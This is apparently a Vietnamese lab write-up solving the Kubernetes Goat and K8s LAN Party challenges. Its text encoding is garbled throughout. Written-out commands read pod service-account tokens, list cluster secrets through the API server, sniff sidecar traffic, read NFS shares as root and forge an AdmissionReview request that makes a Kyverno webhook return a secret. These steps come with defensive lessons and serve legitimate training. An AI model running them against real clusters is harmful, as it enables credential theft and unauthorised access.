---
title: "Tu?n 2 - Th?c h�nh v� nghi�n c?u c�c ki thu?t t?n c�ng Kubernetes"
date: 2026-05-24 00:00:00 +0700
categories: ["Security Research"]
tags: ["Kubernetes", "Security"]
---


# Bu?i 1 : H?c tr�n KubernetesGoat

## D?ng cluster b?ng Kind

```
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.31.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind
kind version
```


C�i kubectl
```
sudo apt install -y kubernetes-client
kubectl version --client
```


T?o cluster

```
kind create cluster --name goat
kubectl get nodes
```


![](/assets/images/posts/Pasted%20image%2020260520151056.png)


![](/assets/images/posts/Pasted%20image%2020260520151147.png)


```
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
chmod +x setup-kubernetes-goat.sh access-kubernetes-goat.sh
bash setup-kubernetes-goat.sh
kubectl get pods
bash access-kubernetes-goat.sh
```


![](/assets/images/posts/Pasted%20image%2020260520151812.png)


## B�i 1 : Gaining enviroment information

B�i d?u ti�n l� enum d? t�m ra c�c cred c?a h? th?ng

�H?u h?t c�c phi�n b?n di?n to�n khi ch?y ?ng d?ng d?u luu tr? th�ng tin nh?y c?m nhu secrets, api_keys, v.v. trong c�c bi?n m�i tru?ng. Tuong t?, trong Kubernetes, h?u h?t m?i ngu?i luu tr? th�ng tin nh?y c?m nhu Kubernetes Secrets v� c�c gi� tr? Config trong c�c bi?n m�i tru?ng v� n?u k? t?n c�ng c� th? t�m th?y c�c l? h?ng ?ng d?ng nhu RCE (th?c thi m� t? xa) ho?c ch�n l?nh th� b� m?t d� s? b? l?.


![](/assets/images/posts/Pasted%20image%2020260520152145.png)



Tru?c ti�n th� t enum b?ng c�c l?nh co b?n

![](/assets/images/posts/Pasted%20image%2020260520152345.png)


```
oot@system-monitor-deployment-866f697c75-67qj4:/# env
KUBERNETES_SERVICE_PORT_HTTPS=443
SYSTEM_MONITOR_SERVICE_SERVICE_PORT=8080
BUILD_CODE_SERVICE_PORT_3000_TCP_PROTO=tcp
KUBERNETES_GOAT_HOME_SERVICE_SERVICE_PORT=80
KUBERNETES_SERVICE_PORT=443
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT=80
HOSTNAME=system-monitor-deployment-866f697c75-67qj4
BUILD_CODE_SERVICE_PORT=tcp://10.96.99.17:3000
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_ADDR=10.96.59.36
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP=tcp://10.96.59.36:8080
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP=tcp://10.96.78.20:5000
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO=tcp
HEALTH_CHECK_SERVICE_PORT_80_TCP=tcp://10.96.17.194:80
BUILD_CODE_SERVICE_PORT_3000_TCP_PORT=3000
INTERNAL_PROXY_INFO_APP_SERVICE_PORT=tcp://10.96.78.20:5000
POOR_REGISTRY_SERVICE_PORT_5000_TCP_ADDR=10.96.58.92
HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR=10.96.17.194
INTERNAL_PROXY_API_SERVICE_PORT=tcp://10.96.185.85:3000
PWD=/
K8S_GOAT_VAULT_KEY=k8s-goat-cd2da27224591da2b48ef83826a8a6c3
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_ADDR=10.96.78.20
HEALTH_CHECK_SERVICE_PORT=tcp://10.96.17.194:80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP=tcp://10.96.139.85:80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO=tcp
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT=8080
POOR_REGISTRY_SERVICE_SERVICE_PORT=5000
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO=tcp
POOR_REGISTRY_SERVICE_PORT_5000_TCP_PROTO=tcp
HOME=/root
BUILD_CODE_SERVICE_SERVICE_PORT=3000
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
POOR_REGISTRY_SERVICE_PORT_5000_TCP_PORT=5000
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT=5000
HEALTH_CHECK_SERVICE_PORT_80_TCP_PROTO=tcp
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST=10.96.78.20
HEALTH_CHECK_SERVICE_SERVICE_HOST=10.96.17.194
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PORT=5000
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO=tcp
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PORT=3000
BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR=10.96.99.17
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_ADDR=10.96.185.85
SYSTEM_MONITOR_SERVICE_PORT=tcp://10.96.59.36:8080
SHLVL=1
BUILD_CODE_SERVICE_SERVICE_HOST=10.96.99.17
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT=80
INTERNAL_PROXY_API_SERVICE_SERVICE_PORT=3000
SYSTEM_MONITOR_SERVICE_SERVICE_HOST=10.96.59.36
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP=tcp://10.96.185.85:3000
KUBERNETES_GOAT_HOME_SERVICE_SERVICE_HOST=10.96.139.85
KUBERNETES_SERVICE_HOST=10.96.0.1
INTERNAL_PROXY_API_SERVICE_SERVICE_HOST=10.96.185.85
KUBERNETES_GOAT_HOME_SERVICE_PORT=tcp://10.96.139.85:80
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
BUILD_CODE_SERVICE_PORT_3000_TCP=tcp://10.96.99.17:3000
HEALTH_CHECK_SERVICE_SERVICE_PORT=80
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR=10.96.139.85
POOR_REGISTRY_SERVICE_SERVICE_HOST=10.96.58.92
POOR_REGISTRY_SERVICE_PORT_5000_TCP=tcp://10.96.58.92:5000
POOR_REGISTRY_SERVICE_PORT=tcp://10.96.58.92:5000
_=/usr/bin/env
```


- M�nh dang l�root�**trong container**, chua c� nghia l� root c?a node.
- Pod hi?n t?i:�system-monitor-deployment-866f697c75-67qj4.
- Kubernetes API server:�10.96.0.1:443�ho?c DNS�kubernetes.default.svc.
- C� nhi?u service n?i b?:�build-code,�internal-proxy,�poor-registry,�health-check.
- C� m?t secret l? ngay trong env:
    
    `K8S_GOAT_VAULT_KEY=k8s-goat-cd2da27224591da2b48ef83826a8a6c3`

![](/assets/images/posts/Pasted%20image%2020260520152824.png)

��y c� v? l� flag c?a b�i
- C� thu m?c d�ng nghi:
    
    `/host-system`
![](/assets/images/posts/Pasted%20image%2020260520153006.png)


Pod n�y c� service account token du?c mount c� namespace l� default 

-> T? trong container n�y , ta c� th? d�ng identity c?a SA du?c g?n cho pod n�y. 


Ch�ng ta c� th? kh�m ph� container b?ng c�ch ch?y c�c l?nh kh�c nhau d? c� th? enum d? c� th? hi?u hon v? h? th?ng 

Ch�ng ta c� th? get the container runtime b?ng c�ch ch?y nh?ng l?nh sau

```
cat /proc/self/cgroup
```

![](/assets/images/posts/Pasted%20image%2020260520154719.png)


Get the information of the container host

```
cat /etc/hosts/
```


Get the mount information

``` 
mount
```


�Access the environment variables, including Kubernetes secrets mounted and service names, ports, etc

```
printenv
```


Ch�ng ta qua b�i ti?p theo l� 

### K8s namespace bypass

![](/assets/images/posts/Pasted%20image%2020260520160125.png)

��y l� m?t quan ni?m sai l?m l?n trong th? gi?i Kubernetes. H?u h?t m?i ngu?i cho r?ng khi c� c�c namespace kh�c nhau trong Kubernetes v� c�c t�i nguy�n du?c tri?n khai v� qu?n l�, ch�ng s? an to�n v� kh�ng th? truy c?p l?n nhau

Theo m?c d?nh K8S s? d?ng lu?c d? m?ng ph?ng , c� nghia l� c�c pod/service trong 1 cluster c� th? n�i chuy?n v?i nhau. M� namespace ? trong cluster kh�ng c� s? h?n ch? b?o m?t m?ng theo m?t d?nh. Anyone ? trong namespace d?u c� th? n�i chuy?n v?i namespacce kh�c . Trong tru?ng h?p sau d�y th� ch�ng ta c� th? bypass namespace d? c� th? truy c?p t�i nguyen c?a namespace kh�c


![](/assets/images/posts/Pasted%20image%2020260520164929.png)



![](/assets/images/posts/Pasted%20image%2020260520165306.png)


truy c?p v�o b�i lab 

![](/assets/images/posts/Pasted%20image%2020260520165313.png)

�?u ti�n ch�ng ta c?n ph?i hi?u v? th�ng tin d?a ch? IP c?a cluster d? c� th? ti?n h�nh recon qu�t c�c d�y m?ng c?a cluster

M?t s? l?nh co b?n d? c� th? xem l� : ip route , ifconfig , printenv,...

![](/assets/images/posts/Pasted%20image%2020260520165627.png)

![](/assets/images/posts/Pasted%20image%2020260520170058.png)


Pod IP: 10.244.0.15
Pod CIDR route: 10.244.0.0/24
Kubernetes DNS: 10.96.0.10
Service network th?y qua env: 10.96.x.x
DNS search: default.svc.cluster.local svc.cluster.local cluster.local

![](/assets/images/posts/Pasted%20image%2020260520171048.png)


RBAC d� ch?n ko cho t d?c service r?i

 V� b�i g?i � �Kubernetes-Goat loves cache�, ta nghi c� cache service. Cache thu?ng l� Redis ho?c Memcached. Redis d�ng port�6379.

zmap�m?c d?nh�**blacklist private ranges**, trong d� c�10.0.0.0/8, n�n n� t? ch?n kh�ng cho scan. V� v?y b?n b? do?n d� v� scan redis port d? t�m du?c d�y m?ng c?a redis
![](/assets/images/posts/Pasted%20image%2020260520175958.png)

![](/assets/images/posts/Pasted%20image%2020260520180054.png)



5. Ngo�i scan IP, Kubernetes c�n h? tr? DNS service theo d?ng:

`<service-name>.<namespace>.svc.cluster.local`

n�n ta ph�n gi?i du?c t�n mi?n ch?ng t? r?ng �t? pod namespace�default, b?n c� th? resolve du?c service ? namespace�secure-middleware. Gi? test port Redis:

![](/assets/images/posts/Pasted%20image%2020260520175226.png)

- Namespace�default�v�secure-middleware�kh�c nhau.
- Nhung pod�hacker-container�v?n truy c?p du?c Redis service namespace kh�c.
- L� do: Kubernetes m?c d?nh flat network, namespace kh�ng t? t?o network isolation.
- C�ch ph�ng th?: d�ng�**NetworkPolicy**, auth cho Redis/cache, kh�ng tin �internal only�.



### RBAC least privileges misconfiguration

![](/assets/images/posts/Pasted%20image%2020260520182649.png)

Trong th?c t?, ch�ng ta thu?ng th?y c�c nh� ph�t tri?n v� nh�m DevOps c?p quy?n d?a tr�n tu  duy m?c d?nh cho t?t c? v� nghi r?ng n� s? ti?n l?i , t?c l� c?p quy?n  nhi?u hon m?c c?n thi?t. �i?u n�y d?n d?n vi?c k? t?n c�ng c� du?c nhi?u quy?n ki?m so�t v� d?c quy?n vu?t ngo�i ph?m v? m� h? d? d?nh.

M?c ti�u b�i n�y l� 
D�ng service account trong pod d? g?i Kubernetes API
L?i d?ng RBAC qu� r?ng
�?c secret k8svaultapikey
L?y k8s_goat_flag

Tru?c khi v�o b�i th� tui mu?n n�i so v? kh�i ni?m v? ServiceAccount cung nhu RBAC 



**1. X�c d?nh service account token**

![](/assets/images/posts/Pasted%20image%2020260520183200.png)


**2. Set bi?n d? g?i API server**

export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

![](/assets/images/posts/Pasted%20image%2020260520183500.png)

**3. Recon quy?n b?ng REST API**

List secret trong namespace hi?n t?i:

`curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \ $APISERVER/api/v1/namespaces/$NAMESPACE/secrets`

![](/assets/images/posts/Pasted%20image%2020260520183859.png)


![](/assets/images/posts/Pasted%20image%2020260520183930.png)

Decode ra th� l?y du?c flag

![](/assets/images/posts/Pasted%20image%2020260520183947.png)

1. **Pod c� Kubernetes identity ri�ng**  
    Pod thu?ng du?c g?n m?t�**ServiceAccount**. Token c?a ServiceAccount n?m trong:

`/var/run/secrets/kubernetes.io/serviceaccount/`

2. **C� shell trong pod l� c� th? g?i Kubernetes API**  
    N?u attacker c� RCE/shell trong container, h? c� th? l?y token d� r?i g?i API server:

`https://${KUBERNETES_SERVICE_HOST}`

3. **RBAC quy?t d?nh pod du?c l�m g� trong cluster**  
    Token kh�ng t? nguy hi?m n?u RBAC ch?t. Nhung n?u ServiceAccount du?c c?p quy?n qu� r?ng, attacker c� th? list/get t�i nguy�n nh?y c?m.
    
4. **Secret trong Kubernetes ch? an to�n n?u quy?n d?c du?c ki?m so�t t?t**  
    Trong b�i n�y, ServiceAccount d�ng l? ch? c?n quy?n v?i�webhookapikey, nhung l?i d?c du?c c?�vaultapikey.
    
5. **Least privilege r?t quan tr?ng**  
    ��y l� l?i th?c t? hay g?p: DevOps c?p quy?n �cho ti?n�, v� d?�get/list secrets, r?i m?t pod b? compromise c� th? bi?n th�nh credential theft trong cluster.



##  Bu?i 2 : K8s Lan Party

![](/assets/images/posts/Pasted%20image%2020260523150131.png)


![](/assets/images/posts/Pasted%20image%2020260523150204.png)

�?n v?i b�i d?u ti�n th� t s? l�m 1 chall v? Recon , th� nhu b?n n�o d� t?ng l�m c�c b�i lab v? leo thang th� vi?c d?u ti�n d? c� th? leo thang du?c th� ch�ng ta c?n ph?i recon ho?c enum d? c� th�m 1 v�i attack surfaces , n� gi�p �ch cho ch�ng ta trong c�c bu?c n�ng cao d?c quy?n ti?p theo . 

Trong b�i lab n�y , khi m� t d� compomise v�o 1 Pod trong K8s , v� bu?c ti?p theo l� mu?n kh�m ph� th�m c�c internal service d? c�  th? m? r?ng ph?m vi leo thang.

Th�ng thu?ng K8s , c�c service thu?ng li�n l?c v?i nhau qua DNS n?i b?. 

Hai lo?i th�nh ph?n ch�nh c?a Kubernetes m� b?n s? quan t�m nh?t khi mu?n t?n c�ng c�c ?ng d?ng kh�c c� th? truy c?p du?c tr�n m?ng trong c?m l�[pod](https://kubernetes.io/docs/concepts/workloads/pods/)�v�[service](https://kubernetes.io/docs/concepts/services-networking/service/)�.

Pod l� c�c nh�m g?m m?t ho?c nhi?u container dang ch?y, v� d�y l� noi c�c ?ng d?ng m?ng n?i b? m� b?n mu?n t?n c�ng s? ho?t d?ng. M?i Pod c� d?a ch? IP internal cluster du?c li�n k?t v?i ch�ng, v� c� m?t ho?c nhi?u c?ng m?ng du?c c�ng khai m� b?n c� th? s? d?ng d? giao ti?p v?i c�c ?ng d?ng m?ng.

C�c service l� nh?ng c�ch th?c th�n thi?n d? hi?n th? c�c ?ng d?ng dang ch?y tr�n m?t ho?c nhi?u pod. Ch�ng cung c� d?a ch? IP c?a cluster v� m?t ho?c nhi?u c?ng du?c hi?n th?, cung nhu nhi?u b?n ghi DNS li�n k?t du?c c?u h�nh trong tr�nh ph�n gi?i DNS c?a c?m. Vi?c truy c?p ?ng d?ng b?ng d?ch v? so v?i truy c?p tr?c ti?p v�o pod thu?ng tuong t? nhau, tuy nhi�n c�c service  c� th�m c�c t�nh nang kh�m ph� c� th? h?u �ch cho ch�ng ta.

�?a ch? IP du?c s? d?ng cho c�c pod thu?ng n?m trong m?t d?i m?ng ri�ng bi?t, kh�c v?i d?a ch? IP c?a c�c d?ch v?.

Gi? ch�ng ta d� x�c d?nh du?c nh?ng g� m�nh c?n t�m, h�y c�ng xem x�t m?t s? phuong ph�p c� th? s? d?ng d? x�c d?nh c�c th�nh ph?n n�y.


�?u ti�n ch�ng ta s? ki?m tra c�c bi?n m�i tru?ng , ch�ng thu?ng ch?a d?a  ch?  ip ,port c?a c�c  service kh�c trong cluster  . 


![](/assets/images/posts/Pasted%20image%2020260523152812.png)


Ngo�i ra b?n c� th? l?y d?a ch? IP c?a c?m l� c�c t?p�`/etc/hosts`(cung c?p d?a ch? IP c?c b? c?a pod, m� b?n cung c� th? l?y t? c�c l?nh�`ip`ho?c�`ifconfig`) v�`/etc/resolv.conf`(cung c?p d?a ch? m�y ch? DNS c?a c?m v� c�c mi?n t�m ki?m DNS, t? d� suy ra namespace c?a pod).

Ngo�i ra b?n cung c� th? l?y c�c SA token c?a pod ho?c ra t�m c�c namespace c?a pod dang ch?y . https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue


Ti?p t?c v?i b�i n�y th� ch�ng ta c� th? s? d?ng 1 c�i tool dnscan https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e d? c� th? qu�t 

![](/assets/images/posts/Pasted%20image%2020260523153737.png)

Khi ch�ng ta ki?m tra b?ng env th� c� th? th?y r?ng  IP c?a API server c?a K8s l� 10.100.0.1 port l� 443 

![](/assets/images/posts/Pasted%20image%2020260523154220.png)

k?t qu? **Hostname:** `getflag-service.k8s-lan-party.svc.cluster.local.`

C�i t�n **"getflag-service"** ch�nh l� noi ch?a Flag ho?c m� d? vu?t qua th? th�ch n�y.

![](/assets/images/posts/Pasted%20image%2020260523154415.png)




![](/assets/images/posts/Pasted%20image%2020260523154614.png)


T?i ph?n ti?p theo l� ph?n finding neighbour 

 Th� theo nhu m�nh t�m hi?u sidecar container l� m?t container ch?y "k�m" theo container ch�nh trong c�ng m?t Pod.
- **M?c d�ch:** N� kh�ng th?c hi?n logic ch�nh c?a ?ng d?ng m� cung c?p c�c d?ch v? h? tr? nhu: ghi log, gi�m s�t, ho?c **b?o m?t**

V� c�c container n?m trong c�ng m?t **Kubernetes Pod** s? d�ng chung m?t **network namespace**, ch�ng s? chia s? ho�n to�n giao di?n m?ng (network interfaces), loopback adapter (localhost) v� d?a ch? IP v?i nhau.

N?u c� m?t container kh�c dang ch?y ng?m ngay b�n c?nh b?n trong Pod n�y, m?i d? li?u m?ng m� n� g?i ho?c nh?n v?i c�c d?ch v? n?i b? d?u c� th? xem t? ch�nh container c?a b?n.


```
tcpdump -A
```

![](/assets/images/posts/Pasted%20image%2020260523155633.png)

V� d�y l� flag

H�y d?m b?o r?ng giao ti?p gi?a c�c Pod lu�n du?c m� h�a. C�ch don gi?n nh?t d? b?t d?u m� h�a giao ti?p gi?a c�c Pod l� s? d?ng�[service mesh](https://www.techtarget.com/searchitoperations/definition/service-mesh)�.


![](/assets/images/posts/Pasted%20image%2020260523155755.png)


giao th?c n�y ra d?i t? th?i k? m� ki?m so�t truy c?p (access control) ch? d?a v�o m?ng ,nghia l � m�nh ko c?n x�c th?c b?ng th�ng tin  dang nh?p . Tui tham kh?o tr�n m?ng th� nghi ngay t?i NFS , ho?c AWS EFS

![](/assets/images/posts/Pasted%20image%2020260523160134.png)


![](/assets/images/posts/Pasted%20image%2020260523160237.png)

D�ng c�ng c? NFS Client d? "bypass" quy?n

Trong m�i tru?ng n�y c� s?n c�ng c? `nfs-ls` v� `nfs-cat` (thu?c b? `libnfs`). Giao th?c NFSv4 cho ph�p ch�ng ta truy?n tham s? `uid=0` (Root) v� `gid=0` tr?c ti?p qua chu?i k?t n?i d? �p server nh?n di?n m�nh l� Root

![](/assets/images/posts/Pasted%20image%2020260523160608.png)


![](/assets/images/posts/Pasted%20image%2020260523160648.png)


```
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: istio-get-flag
  namespace: k8s-lan-party
spec:
  action: DENY
  selector:
    matchLabels:
      app: "{flag-pod-name}"
  rules:
  - from:
    - source:
        namespaces: ["k8s-lan-party"]
    to:
    - operation:
        methods: ["POST", "GET"]
```

![](/assets/images/posts/Pasted%20image%2020260523160933.png)

![](/assets/images/posts/Pasted%20image%2020260523161000.png)

https://pulsesecurity.co.nz/advisories/istio-egress-bypass?source=post_page-----c773190e9246---------------------------------------

Phuong ph�p b? qua n�y cho ph�p b?t k? ngu?i d�ng n�o c� userID 1337 d?u c� th? bypass b? l?c proxy c?a Istio, t? d� k�ch ho?t ch�nh s�ch ?y quy?n. May m?n thay, l?n n�y ch�ng ta l� ngu?i d�ng root trong h? th?ng, nghia l� ch�ng ta c� th? t?o m?t ngu?i d�ng kh�c v� d?t userID l� 1337.


![](/assets/images/posts/Pasted%20image%2020260523161337.png)



![](/assets/images/posts/Pasted%20image%2020260523161517.png)


�?u ti�n ch?y dns scan 

![](/assets/images/posts/Pasted%20image%2020260523161701.png)

Kyverno l� c�ng c? qu?n l� ch�nh s�ch (Policy Engine) d�nh ri�ng cho Kubernetes, gi�p b?n x�c th?c, ch?nh s?a v� kh?i t?o t�i nguy�n b?ng ng�n ng? **YAML** quen thu?c. Thay v� h?c ng�n ng? ph?c t?p, Kyverno cho ph�p d?i ngu DevOps t? d?ng h�a vi?c b?o m?t v� chu?n h�a c?u h�nh cluster m?t c�ch don gi?n, hi?u qu? v� c?c k? g?n nh?.

D?a tr�n chall ch�nh s�ch n�y dang th?c hi?n t�nh nang **Mutation**: t? d?ng ch�n gi� tr? b� m?t (secret) v�o bi?n m�i tru?ng `FLAG` cho b?t k? Pod n�o du?c t?o trong namespac

```
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```


V� t�i m�nh bi?t v? admission controllers and mutating webhooks, n�n m�nh ngay l?p t?c hi?u du?c k? v?ng. Du?i d�y l� so d? m� t? c�ch th?c ho?t d?ng.

![](/assets/images/posts/Pasted%20image%2020260523162159.png)

```
cat <<EOF > pod.json
{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "00000000-0000-0000-0000-000000000000",
    "kind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "subResource": "",
    "requestKind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "requestResource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "requestSubResource": "",
    "name": "sensitive-pod",
    "namespace": "sensitive-ns",
    "operation": "CREATE",
    "userInfo": {
      "username": "kubernetes-admin",
      "groups": [
        "system:masters",
        "system:authenticated"
      ]
    },
    "object": {
      "apiVersion": "v1",
      "kind": "Pod",
      "metadata": {
        "name": "sensitive-pod",
        "namespace": "sensitive-ns",
        "labels": {
          "app": "nginx"
        }
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "nginx:latest"
          }
        ]
      }
    },
    "oldObject": null,
    "dryRun": false,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
EOF
```


 Bu?c 2: G?i request d?n Kyverno Webhook

B�y gi? c?u tr�c d� chu?n h�a, b?n ch?y l?nh `curl` n�y d? �p Kyverno tr? flag

```
curl -X POST -H "Content-Type: application/json" --data @pod.json https://kyverno-svc.kyverno/mutate -k
```

![](/assets/images/posts/Pasted%20image%2020260523162910.png)



![](/assets/images/posts/Pasted%20image%2020260523162740.png)


Trong c?m Kubernetes n�y, qu?n tr? vi�n d�ng **Kyverno** d? t? d?ng h�a m?t vi?c:

- H? c�i m?t ch�nh s�ch (Policy) quy d?nh: _"B?t k? ai t?o m?t Pod (v�ng ch?a ?ng d?ng) n?m trong namespace t�n l� `sensitive-ns`, Kyverno s? t? d?ng ch�n th�m m?t bi?n m�i tru?ng ch?a Flag b� m?t v�o Pod d�"_.
    

Th�ng thu?ng, ngu?i d�ng mu?n l?y Flag th� ph?i c� quy?n d�ng l?nh `kubectl` d? t?o m?t Pod th?t trong namespace `sensitive-ns`, sau d� v�o Pod d� d? d?c bi?n m�i tru?ng. Nhung ? d�y, b?n **kh�ng c� quy?n** t?o Pod th?t.


Kyverno ho?t d?ng d?a tr�n co ch? **Mutating Webhook** (m?t d?ch v? m?ng ch?y ng?m). Khi c� y�u c?u t?o Pod, Kubernetes API Server s? g?i m?t g�i tin d? li?u c?u h�nh (d?ng JSON) d?n Webhook n�y c?a Kyverno d? n� ch?nh s?a.

C�i sai nghi�m tr?ng c?a ngu?i qu?n tr? ? d�y l�: **H? m?  d?ch v? Webhook n�y (`https://kyverno-svc.kyverno/mutate`) cho t?t c? c�c Pod n?i b? truy c?p** m� kh�ng h? c?u h�nh tu?ng l?a m?ng (Network Policy) hay x�c th?c mTLS d? ch?n l?i.


1. **G?i c?u h�nh nh�p:** B?n d�ng l?nh `curl` d? g?i m?t file JSON c?u h�nh nh�p (`pod.json`) gi? v? nhu dang mu?n t?o m?t Pod trong namespace `sensitive-ns` th?ng t?i c?ng d?ch v? c?a Kyverno.
    
2. **Kyverno b? l?a:** Kyverno nh?n du?c g�i tin, kh�ng h? ki?m tra xem ai g?i, c? th?y c� y�u c?u t?o Pod ? `sensitive-ns` l� n� t? d?ng l�m theo l?p tr�nh: **Ch�n ngay do?n m� ch?a Flag v�o c?u h�nh** r?i g?i tr? ngu?c l?i cho b?n.
    
3. **L?y Flag:** �o?n m� ch?a Flag tr? v? du?c m� h�a du?i d?ng Base64 d? b?o to�n c?u tr�c d? li?u, b?n ch? c?n mang chu?i d� di gi?i m� (`base64 -d`) l� nh�n th?y Flag l? ra r� m?m m?t.




